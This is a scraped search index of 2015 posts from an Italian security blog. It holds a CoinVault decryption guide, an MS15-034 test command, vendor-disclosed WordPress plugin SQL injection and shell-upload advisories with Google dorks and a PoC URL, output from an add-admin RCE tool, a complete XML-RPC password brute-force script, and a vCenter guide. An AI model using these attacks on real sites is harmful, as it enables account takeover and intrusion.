procedura consiste principalmente in due fasi:\n  Eliminazione del virus\n  Decriptazione dei files\n  Ma andiamo per step:\nStep 1) Annotazione dei dati necessari alla decriptazione Se siete infetti dal ransomware CoinVault vi ritroverete davanti una schermata simile all’immagine soprastante.\nPrima di rimuovere il virus è necessario copiarsi, ad esempio su un file di testo, l’indirizzo bitcoin riportato in basso a destra della finestra (cerchiato in nero nell’immagine).\nSubito dopo cliccare sul bottone “View Encrypted filelist” (cerchiato in azzurro nell’imagine) e salvarsi il file che verrà generato.\nStep 2) Rimozione del virus Per rimuovere il virus potete utilizzare qualsiasi antivirus aggiornato, Kaspersky naturalmente consigli di installare la propria versione TRIAL:\nhttps://kas.pr/kismd\nUna volta installato basta eseguire la classica scansione.\nStep 3) Controllo disponibilità della chiave di decriptazione sul sito Kaspersky Col browser preferito collegarsi all’indirizzo: https://noransom.kaspersky.com/ e nell’apposito form inserire l’indirizzo bitcoin copiato precedentemente nello Step 1 e premere il bottone “Check“\nSe la ricerca non ottiene nessun risultato purtroppo significa che le chiavi di decriptazioni necessarie per i propri file non sono ancora presenti nel database di Kaspersky Lab, quindi la procedura deve essere interrotta.\nNaturalmente le chiavi verranno aggiornate costantemente, quindi è consigliato riprovare questo step giornalmente!\nIn caso di esito potivio annotarsi il codice IV e Key che apparirà a video (in verità potrebbero anche essere più di uno, quindi annotarseli tutti).\nStep 4) Download tool decrypter Collegarsi sempre al sito https://noransom.kaspersky.com e scaricarsi il tool di decriptazione: kaspersky-coinvault-decryptor.exe\nIl software necessita delle librerie Microsoft .NET Framework 4, assicuratevi di averle preinstallate sul proprio sistema altrimenti all’eseguzione del decrypter vi apparirà un messaggio d’errore.\nUna volta eseguito il tool vi apparirà la seguente maschera:\nI passi da eseguire sono i seguenti:\n Premere il bottone “Select List” e selezionare il file creato nello STEP 1 Premere il bottone “Select File” e selezionare il file compromesso che vogliamo decriptare Inserire il codice IV generato dalla pagina web nello STEP 3 Inserire il codice KEY (la chiave) generato dalla pagina web nello STEP 3  ATTENZIONE\nnel caso in cui vi siano stati rilasciati codici IV e KEY multipli, Kaspersky Lab consiglia di NON selezionare il checkbox:\n“Overwrite encrypted file with decrypted contents”\nQuesto perchè nel caso in cui il tentativo di decriptazione con il primi codici IV/KEY fallisse, si rischierebbe di compromettere definitivamente il file criptato!\nConsigli Oltre a tenere l’antivirus e l’antimalware aggironato, fate attenzione agli allegati sospetti che vi arrivano per e-mail.\nSpesso questi ransomware vengono spacciati per documenti doc o pdf contententi fatture, bollette, o documenti in generale.\nNon mi resta che augurarvi: BUONA FORTUNA!\n","permalink":"https://www.homelab.it/index.php/2015/04/18/coinvault-ransomware-come-recuperare-i-files-criptati/","summary":"Introduzione I ransomware sono i nuovi malware (Malicious Software) che non solo infettano il sistema del malcapitato, ma criptano tutti i dati sensibili presenti sul proprio drive locale, dischi/pendrive collegate e, nello sciagurato caso, anche directory/unità di rete montate.\nUna volta criptati i dati non sono più leggibili, a meno che non si paghi un riscatto (ransom in inglese) seguendo delle precise istruzioni rilasciate dagli sviluppatori del virus.\nCoinVault ransomware CoinVault è un dei moltissimi ransomware che stanno infettando moltissimi utenti chiedendo un riscatto in bitcoin, la famosissima moneta elettronica.","title":"CoinVault ransomware: come (provare a) recuperare i files criptati"},{"content":" Introduzione E’ stata rilevato un nuovo attacco tramite exploit verso il demone IIS (Internet Information Server) dei sistemi operativi Windows.\nIn realtà la libreria vulnerabile si chiama HTTP.sys che viene utilizzata maggiormente dal demone ISS, ma non solo, teoricamente tutti i programmi che ne usufruiscono sono a rischio!\nA cosa serve la libreria HTTP.sys?\nPer farla breve e semplice la sua funzione è quella di elaborare richieste HTTP.\nTipologia di vulerabilità e Exploit Microsoft ha classificato questa vulnerabilità come Remote Code Execution, ma per adesso pubblicamente sono stati rilasciati exploit ti tipologia DoS:\nMS Windows (HTTP.sys) HTTP Request Parsing DoS (MS15-034)\nMicrosoft Window – HTTP.sys PoC (MS15-034)\nSistemi a rischio Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1, e Windows Server 2012 R2 con a bordo almeno IIS 6.\nTest di vulnerabilità Per testare il proprio sistema basta eseguire una semplice chiamate GET verso IIS con un particolare HEADER:\ncurl -v [ipaddress]/ -H \u0026quot;Host: MS15034\u0026quot; -H \u0026quot;Range: bytes=0-18446744073709551615\u0026quot; wget -O /dev/null --header=\u0026quot;Range: 0-18446744073709551615\u0026quot; http://[ip address]/  Se il sistema è vulnerabile si riceverà la risposta:\n\u0026ldquo;Requested Header Range Not Satisfiable\u0026rdquo;\nCome proteggersi   Aggiornare il sistema con la patch rilasciata da Microsoft il 14 Febbraio: MS15-034\n  Nell’impossibilità di poter aggiornare nell’immediato il sistema operativo, è possibile configurare ad hoc i propri WaF (Web Application Firewall) o IPS (Intrusion prevention systems)\n  Personalmente sto testando delle regole sul WaF modsecurity, spero di pubblicarle presto…rimanete in contatto 😉\nLink di riferimento sans.edu\n","permalink":"https://www.homelab.it/index.php/2015/04/17/ms15-034-http-sys-iis-dos-and-possible-remote-code-execution-aggiornamento-critico/","summary":"Introduzione E’ stata rilevato un nuovo attacco tramite exploit verso il demone IIS (Internet Information Server) dei sistemi operativi Windows.\nIn realtà la libreria vulnerabile si chiama HTTP.sys che viene utilizzata maggiormente dal demone ISS, ma non solo, teoricamente tutti i programmi che ne usufruiscono sono a rischio!\nA cosa serve la libreria HTTP.sys?\nPer farla breve e semplice la sua funzione è quella di elaborare richieste HTTP.\nTipologia di vulerabilità e Exploit Microsoft ha classificato questa vulnerabilità come Remote Code Execution, ma per adesso pubblicamente sono stati rilasciati exploit ti tipologia DoS:","title":"MS15-034 HTTP.sys (IIS) DoS And Possible Remote Code Execution – AGGIORNAMENTO CRITICO"},{"content":" Simple WordPress Xml-rpc Brute Force written in bash with curl #!/bin/sh\r#####################\r# # # Scripted By : Claudio Viviani # http://www.homelab.it # http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) # http://ffhd.homelab.it (Free Fuzzy Hashes Database) # # info@homelab.it # homelabit@protonmail.ch # # https://www.facebook.com/homelabit # https://twitter.com/homelabit # https://plus.google.com/+HomelabIt1/ # https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww # #####################\rurl=$1\ruser=$2\rwordlist=$3\rif [ -z \u0026#34;$wordlist\u0026#34; ]; then\recho \u0026#34;Usage: $0 http://TARGT username wordlist.txt\u0026#34;\rexit 1\relif [ ! -f \u0026#34;$wordlist\u0026#34; ]; then\recho \u0026#34;Can\u0026#39;t open $wordlist file\u0026#34;\rexit 1\rfi\rfor password in $(cat $wordlist); do\rcat \u0026lt;\u0026lt; EOF \u0026gt; /tmp/brutexmlpayload.txt\r\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;iso-8859-1\u0026#34;?\u0026gt;\r\u0026lt;methodCall\u0026gt;\r\u0026lt;methodName\u0026gt;wp.getUsersBlogs\u0026lt;/methodName\u0026gt;\r\u0026lt;params\u0026gt;\r\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;$user\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\r\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;$password\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\r\u0026lt;/params\u0026gt;\r\u0026lt;/methodCall\u0026gt;\rEOF\rbody=$(curl --data @/tmp/brutexmlpayload.txt $url/xmlrpc.php \u0026gt;/tmp/brutexmlbody.txt 2\u0026gt;/dev/null)\rif ! grep \u0026#34;403\u0026#34; /tmp/brutexmlbody.txt \u0026gt; /dev/null; then\recho \u0026#34;PASSWORD FOUND: $password\u0026#34;\rfi\r# pause time\rsleep 1\rdone\rrm -f /tmp/brutexmlpayload.txt /tmp/brutexmlbody.txt Download: wordpress-xml-brute.sh\n","permalink":"https://www.homelab.it/index.php/2015/04/16/simple-wordpress-xml-rpc-brute-force-in-bash-with-curl/","summary":"Simple WordPress Xml-rpc Brute Force written in bash with curl #!/bin/sh\r#####################\r# # # Scripted By : Claudio Viviani # http://www.homelab.it # http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) # http://ffhd.homelab.it (Free Fuzzy Hashes Database) # # info@homelab.it # homelabit@protonmail.ch # # https://www.facebook.com/homelabit # https://twitter.com/homelabit # https://plus.google.com/+HomelabIt1/ # https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww # #####################\rurl=$1\ruser=$2\rwordlist=$3\rif [ -z \u0026#34;$wordlist\u0026#34; ]; then\recho \u0026#34;Usage: $0 http://TARGT username wordlist.txt\u0026#34;\rexit 1\relif [ !","title":"Simple WordPress Xml-rpc Brute Force written in bash with cURL"},{"content":"######################\r# Exploit Title : WordPress Ajax Store Locator \u0026lt;= 1.2 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356\r# Software Link : Premium\r# Dork Google: inurl:ajax-store-locator\r# index of ajax-store-locator # Date : 2015-03-29\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info:\rThe \u0026#34;sl_dal_searchlocation_cbf\u0026#34; ajax function is affected from SQL Injection vulnerability\r\u0026#34;StoreLocation\u0026#34; var is not sanitized\r##################### Discovered By : Claudio Viviani http://www.homelab.it\rhttp://ffhd.homelab.it (Free Fuzzy Hashes Database)\rinfo@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/15/wordpress-ajax-store-locator-sql-injection-vulnerability/","summary":"######################\r# Exploit Title : WordPress Ajax Store Locator \u0026lt;= 1.2 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356\r# Software Link : Premium\r# Dork Google: inurl:ajax-store-locator\r# index of ajax-store-locator # Date : 2015-03-29\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info:\rThe \u0026#34;sl_dal_searchlocation_cbf\u0026#34; ajax function is affected from SQL Injection vulnerability\r\u0026#34;StoreLocation\u0026#34; var is not sanitized\r##################### Discovered By : Claudio Viviani http://www.","title":"WordPress Ajax Store Locator SQL Injection Vulnerability"},{"content":"\n######################\r# Exploit Title : WordPress Video Gallery 2.8 SQL Injection Vulnerabilitiy\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip\r# Dork Google: inurl:/wp-admin/admin-ajax.php?action=googleadsense\r# Date : 2015-04-04\r# Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from SQL injection ###################### # Vulnerability Disclosure Timeline: 2015-04-04: Discovered vulnerability 2015-04-06: Vendor Notification 2015-04-07: Vendor Response/Feedback 2015-04-07: Vendor Send Fix/Patch (same version number) 2015-04-13: Public Disclosure ####################### Discovered By : Claudio Viviani http://www.homelab.it http://ffhd.homelab.it (Free Fuzzy Hashes Database) info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/13/wordpress-video-gallery-2-8-sql-injection-vulnerability/","summary":"######################\r# Exploit Title : WordPress Video Gallery 2.8 SQL Injection Vulnerabilitiy\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip\r# Dork Google: inurl:/wp-admin/admin-ajax.php?action=googleadsense\r# Date : 2015-04-04\r# Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from SQL injection ###################### # Vulnerability Disclosure Timeline: 2015-04-04: Discovered vulnerability 2015-04-06: Vendor Notification 2015-04-07: Vendor Response/Feedback 2015-04-07: Vendor Send Fix/Patch (same version number) 2015-04-13: Public Disclosure ####################### Discovered By : Claudio Viviani http://www.","title":"WordPress Video Gallery 2.8 SQL Injection Vulnerability"},{"content":"###################### # Exploit Title : WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability # Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip # Date : 2015-04-1\r# Dork Google: index of website-contact-form-with-file-upload index of /uploads/contact_files/ # Tested on : Linux BackBox 4.0 / curl 7.35.0 ##################### # Info : The \u0026#34;upload_file()\u0026#34; ajax function is affected from unrestircted file upload vulnerability. ##################### Discovered By : Claudio Viviani http://www.homelab.it http://ffhd.homelab.it (Free Fuzzy Hashes Database) info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/12/wordpress-n-media-website-contact-form-shell-upload/","summary":"###################### # Exploit Title : WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability # Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip # Date : 2015-04-1\r# Dork Google: index of website-contact-form-with-file-upload index of /uploads/contact_files/ # Tested on : Linux BackBox 4.0 / curl 7.35.0 ##################### # Info : The \u0026#34;upload_file()\u0026#34; ajax function is affected from unrestircted file upload vulnerability. ##################### Discovered By : Claudio Viviani http://www.","title":"WordPress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability"},{"content":"######################\r# Exploit Title : WordPress Duplicator 0.5.14 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://lifeinthegrid.com/labs/duplicator/\r# Software Link : https://downloads.wordpress.org/plugin/duplicator.0.5.14.zip\r# Date : 2015-04-08\r# Tested on : Linux / Mozilla Firefox ######################\r# Description\rWordPress Duplicator 0.5.14 suffers from remote SQL Injection Vulnerability\rLocation file: /view/actions.php\rThis is the bugged ajax functions wp_ajax_duplicator_package_delete:\rfunction duplicator_package_delete() {\rDUP_Util::CheckPermissions(\u0026#39;export\u0026#39;);\rtry {\rglobal $wpdb;\r$json\t= array();\r$post\t= stripslashes_deep($_POST);\r$tblName\t= $wpdb-\u0026gt;prefix . \u0026#39;duplicator_packages\u0026#39;;\r$postIDs\t= isset($post[\u0026#39;duplicator_delid\u0026#39;]) ? $post[\u0026#39;duplicator_delid\u0026#39;] : null;\r$list\t= explode(\u0026#34;,\u0026#34;, $postIDs);\r$delCount\t= 0;\rif ($postIDs != null) {\rforeach ($list as $id) {\r$getResult = $wpdb-\u0026gt;get_results(\u0026#34;SELECT name, hash FROM `{$tblName}` WHERE id = {$id}\u0026#34;, ARRAY_A);\rif ($getResult) {\r$row\t= $getResult[0];\r$nameHash\t= \u0026#34;{$row[\u0026#39;name\u0026#39;]}_{$row[\u0026#39;hash\u0026#39;]}\u0026#34;;\r$delResult\t= $wpdb-\u0026gt;query(\u0026#34;DELETE FROM `{$tblName}` WHERE id = {$id}\u0026#34;);\rif ($delResult != 0) {\r$post[\u0026#39;duplicator_delid\u0026#39;] variable is not sanitized\rA authorized user with \u0026#34;export\u0026#34; permission or a remote unauthenticated attacker could\ruse this vulnerability to execute arbitrary SQL queries on the victim\rWordPress web site by enticing an authenticated admin (CSRF)\r######################\r# Vulnerability Disclosure Timeline:\r2015-04-08: Discovered vulnerability\r2015-04-08: Vendor Notification\r2015-04-09: Vendor Response/Feedback 2015-04-10: Vendor Send Fix/Patch (0.5.16)\r2015-04-10: Public Disclosure #######################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rhttp://ffhd.homelab.it (Free Fuzzy Hashes Database)\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/10/wordpress-duplicator-0-5-14-sql-injection-vulnerability/","summary":"######################\r# Exploit Title : WordPress Duplicator 0.5.14 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://lifeinthegrid.com/labs/duplicator/\r# Software Link : https://downloads.wordpress.org/plugin/duplicator.0.5.14.zip\r# Date : 2015-04-08\r# Tested on : Linux / Mozilla Firefox ######################\r# Description\rWordPress Duplicator 0.5.14 suffers from remote SQL Injection Vulnerability\rLocation file: /view/actions.php\rThis is the bugged ajax functions wp_ajax_duplicator_package_delete:\rfunction duplicator_package_delete() {\rDUP_Util::CheckPermissions(\u0026#39;export\u0026#39;);\rtry {\rglobal $wpdb;\r$json\t= array();\r$post\t= stripslashes_deep($_POST);\r$tblName\t= $wpdb-\u0026gt;prefix .","title":"WordPress Duplicator 0.5.14 SQL Injection Vulnerability"},{"content":"######################\r# Exploit Title : WordPress All In One WP Security \u0026amp; Firewall 3.9.0 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/\r# Software Link : https://mega.co.nz/#!DJAEBLBS!IBiukGo-pirelHmsRV80xZDHIvpqZKtTIqsD8YrMf7U\r# Date : 2015-04-05\r# Tested on : Linux / Mozilla Firefox\r######################\r# Description\rWordPress All In One WP Security \u0026amp; Firewall 3.9.0 suffers from Blind SQL Injection vulnerability\rThere are some pages with wordpress esc_sql function. esc_sql is prone to Blind SQL Injection (discovered by Ryan Dewhurst - http://dewhurstsecurity.com/)\risset($_GET[\u0026#34;orderby\u0026#34;]) ? $orderby = strip_tags($_GET[\u0026#34;orderby\u0026#34;]): $orderby = \u0026#39;\u0026#39;;\risset($_GET[\u0026#34;order\u0026#34;]) ? $order = strip_tags($_GET[\u0026#34;order\u0026#34;]): $order = \u0026#39;\u0026#39;;\r- admin/wp-security-list-404.php\r$orderby = !empty($orderby) ? esc_sql($orderby) : \u0026#39;id\u0026#39;;\r$order = !empty($order) ? esc_sql($order) : \u0026#39;DESC\u0026#39;;\r...\r...\r$data = $wpdb-\u0026gt;get_results(\u0026#34;SELECT * FROM $events_table_name ORDER BY $orderby $order\u0026#34;, ARRAY_A);\r- admin/wp-security-list-login-fails.php\r$orderby = !empty($orderby) ? esc_sql($orderby) : \u0026#39;failed_login_date\u0026#39;;\r$order = !empty($order) ? esc_sql($order) : \u0026#39;DESC\u0026#39;;\r$data = $wpdb-\u0026gt;get_results(\u0026#34;SELECT * FROM $failed_logins_table_name ORDER BY $orderby $order\u0026#34;, ARRAY_A);\r- admin/wp-security-list-acct-activity-php\r$orderby = !empty($orderby) ? esc_sql($orderby) : \u0026#39;login_date\u0026#39;;\r$order = !empty($order) ? esc_sql($order) : \u0026#39;DESC\u0026#39;;\r$data = $wpdb-\u0026gt;get_results(\u0026#34;SELECT * FROM $login_activity_table ORDER BY $orderby $order LIMIT 50\u0026#34;, ARRAY_A)\r- admin/wp-security-list-locked-ip.php\r$orderby = !empty($orderby) ? esc_sql($orderby) : \u0026#39;failed_login_date\u0026#39;;\r$order = !empty($order) ? esc_sql($order) : \u0026#39;DESC\u0026#39;;\r$data = $wpdb-\u0026gt;get_results(\u0026#34;SELECT * FROM $lockdown_table_name WHERE release_date \u0026gt; now() ORDER BY $orderby $order\u0026#34;, ARRAY_A)\r######################\r# Vulnerability Disclosure Timeline:\r2015-04-05: Discovered vulnerability\r2015-04-06: Vendor Notification\r2015-04-06: Vendor Response/Feedback 2015-04-07: Vendor Send Fix/Patch (3.9.1)\r2015-04-07: Public Disclosure #######################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rhttp://ffhd.homelab.it (Free Fuzzy Hashes Database)\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/07/wordpress-all-in-one-wp-security-sql-injection-vulnerability/","summary":"######################\r# Exploit Title : WordPress All In One WP Security \u0026amp; Firewall 3.9.0 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/\r# Software Link : https://mega.co.nz/#!DJAEBLBS!IBiukGo-pirelHmsRV80xZDHIvpqZKtTIqsD8YrMf7U\r# Date : 2015-04-05\r# Tested on : Linux / Mozilla Firefox\r######################\r# Description\rWordPress All In One WP Security \u0026amp; Firewall 3.9.0 suffers from Blind SQL Injection vulnerability\rThere are some pages with wordpress esc_sql function.","title":"WordPress All In One WP Security \u0026 Firewall 3.9.0 SQL Injection Vulnerability"},{"content":"######################\r# Exploit Title : WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Software Link : https://downloads.wordpress.org/plugin/work-the-flow-file-upload.2.5.2.zip\r# Date : 2015-03-14\r# Tested on : Linux BackBox 4.0 / curl 7.35.0\r######################\r# Description:\rWork the Flow File Upload. Embed Html5 User File Uploads and Workflows into pages and posts. Multiple file Drag and Drop upload, Image Gallery display, Reordering and Archiving.\rThis two in one plugin provides shortcodes to embed front end user file upload capability and / or step by step workflow.\r######################\r# Location : http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php\r######################\r# Vulnerability Disclosure Timeline:\r2015-03-14: Discovered vulnerability\r2015-04-03: Vendor Notification\r2015-04-03: Vendor Response/Feedback 2015-04-04: Vendor Fix/Patch (2.5.3)\r2014-04-04: Public Disclosure #####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rhttp://ffhd.homelab.it (Free Fuzzy Hashes Database)\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### Download Exploit: HERE\n","permalink":"https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/","summary":"######################\r# Exploit Title : WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Software Link : https://downloads.wordpress.org/plugin/work-the-flow-file-upload.2.5.2.zip\r# Date : 2015-03-14\r# Tested on : Linux BackBox 4.0 / curl 7.35.0\r######################\r# Description:\rWork the Flow File Upload. Embed Html5 User File Uploads and Workflows into pages and posts. Multiple file Drag and Drop upload, Image Gallery display, Reordering and Archiving.","title":"WordPress Work the flow file upload 2.5.2 Shell Upload Vulnerability"},{"content":" ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ __ __ __ | Y .---.-.----| |--.-----| |_.-----| .---.-.----.-----.\r|. | _ | _| \u0026lt;| -__| _| _ | | _ | __| -__|\r|. \\_/ |___._|__| |__|__|_____|____| __|__|___._|____|_____|\r|: | | |__| |::.|:. | `--- ---\u0026#39; WP Marketplace\rR3m0t3 C0d3 Ex3cut10n\r(Add WP Admin)\rv2.4.0\rWritten by:\rClaudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r[+] Tryng to connect to: http://127.0.0.1\r[!] Account Added\r[!] Location: http://127.0.0.1/wp-login.php\r[!] Username: yna5gM\r[!] Password: Fq2Y7X Google Dork index of \u0026ldquo;wpmarketplace\u0026rdquo;\nDownload Download Exploit: HERE\nUsage claudio@backbox3:~$ python wp_marketplace_240_add_admin.py -t http[s]://localhost[:PORT]\rpython wp_marketplace_240_add_admin.py -t http[s]://localhost[:PORT]/basedir ","permalink":"https://www.homelab.it/index.php/2015/03/24/wp-marketplace-rce/","summary":"___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \\ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---\u0026#39; ___ ___ __ __ __ | Y .---.-.----| |--.-----| |_.-----| .---.-.----.-----.\r|. | _ | _| \u0026lt;| -__| _| _ | | _ | __| -__|\r|. \\_/ |___._|__| |__|__|_____|____| __|__|___._|____|_____|\r|: | | |__| |::.","title":"WP Marketplace 2.4.0  Remote Code Execution (Add WP Admin)"},{"content":"\n######################\r# Exploit Title : WordPress Video Gallery 2.7 SQL Injection Vulnerabilitiy\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.7.zip\r# Dork Google: inurl:/wp-admin/admin-ajax.php?action=rss\r# Date : 2015-02-10\r# Tested on : Windows 7 / Mozilla Firefox\rLinux / Mozilla Firefox ######################\r# Vulnerability Disclosure Timeline:\r2015-02-08: Discovered vulnerability\r2015-02-09: Vendor Notification\r2015-02-10: Vendor Response/Feedback 2015-02-10: Vendor Send Fix/Patch 2015-02-10: Public Disclosure # Description\rWordpress Video Gallery 2.7 suffers from SQL injection\r######################\r# PoC\rhttp://target/wp-admin/admin-ajax.php?action=rss\u0026amp;type=video\u0026amp;vid=[SQLi]\r#####################\r# Fix/patch sent by apptha\u0026#39;s developer\rFile: videogalleryrss.php\rChange line n.47 from:\r$vid = filter_input(INPUT_GET,\u0026#39;vid\u0026#39;);\rto:\r$vid = intval(filter_input(INPUT_GET,\u0026#39;vid\u0026#39;));\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2015/02/11/wordpress-video-gallery-2-7-sql-injection/","summary":"######################\r# Exploit Title : WordPress Video Gallery 2.7 SQL Injection Vulnerabilitiy\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.7.zip\r# Dork Google: inurl:/wp-admin/admin-ajax.php?action=rss\r# Date : 2015-02-10\r# Tested on : Windows 7 / Mozilla Firefox\rLinux / Mozilla Firefox ######################\r# Vulnerability Disclosure Timeline:\r2015-02-08: Discovered vulnerability\r2015-02-09: Vendor Notification\r2015-02-10: Vendor Response/Feedback 2015-02-10: Vendor Send Fix/Patch 2015-02-10: Public Disclosure # Description\rWordpress Video Gallery 2.","title":"WordPress Video Gallery 2.7 SQL Injection"},{"content":"OS: Windows 2008 R2 x64\nvCenter Server: 5.0\nIntro In questo articolo mostrerò come aggiornare VMware vCenter , in particolare dalla versione 5.0 alla 5.5U2.\nIl sistema operativo da dove effettuerò le operazione è Windows 2008 R2 x64.\nRequisiti Per aggiornare vCenter è necessario procurarsi la versione più aggiornata, per fare ciò basta loggarsi con il proprio account sul sito My VMware e\ncercare sotto la sezione Downloads -\u0026gt; All Products la parola chiave “VMware vCenter Server“.\nPrima di effettuare il Download, assicuratevi di aver selezionato l’ultima versione disponibile:\nIndividuata la versione corretta, scaricate vCenter nel formato ISO (vedi immagine sopra).\nProcedura IMPORTANTE: Se avete installato vCenter su una macchina virtuale, prima di iniziare con la procedura, create uno snapshot per sicurezza.\n Per prima cosa montare il file iso sul sistema operativo Windows, in presenza di una macchina virtuale basta utilizzare la funzione del vSphere Client:  Se il vostro vCenter è installato su una macchina fisica, consiglio di estrarre l’immagine iso (ad esempio con WinRar) sul proprio pc client e successivamente copiare il contenuto su una cartella condivisa del server.\nAprire l’unità cd-rom o la cartella contenente il setup di vCenter Server e cliccare sul file “autorun.exe“:  Selezionare sulla sinistra il menu “vCenter Server” e cliccare il bottone in basso “Install“:  Il programma ci chiederà il permesso di aggiornare vCenter Server, cliccare su “Yes”:  Cliccare sul bottone “Next” per inizializzare l’installazione:  Accettare i termini di contratto e premere il bottone “Next“:  Lasciare invariate le impostazioni del Database e cliccare sul bottone “Next“:  Preme il bottone “Install” ed attendere che finisca l’operazione:  Terminare l’installazione premendo il bottone “Finish“:  ","permalink":"https://www.homelab.it/index.php/2015/01/02/come-aggiornare-vmware-vcenter-5/","summary":"OS: Windows 2008 R2 x64\nvCenter Server: 5.0\nIntro In questo articolo mostrerò come aggiornare VMware vCenter , in particolare dalla versione 5.0 alla 5.5U2.\nIl sistema operativo da dove effettuerò le operazione è Windows 2008 R2 x64.\nRequisiti Per aggiornare vCenter è necessario procurarsi la versione più aggiornata, per fare ciò basta loggarsi con il proprio account sul sito My VMware e\ncercare sotto la sezione Downloads -\u0026gt; All Products la parola chiave “VMware vCenter Server“.","title":"Come aggiornare VMware vCenter 5"},{"content":" ___ ___ __\r| Y .-----.----.--| .-----.----.-----.-----.-----.\r|. | | _ | _| _ | _ | _| -__|__ --|__ 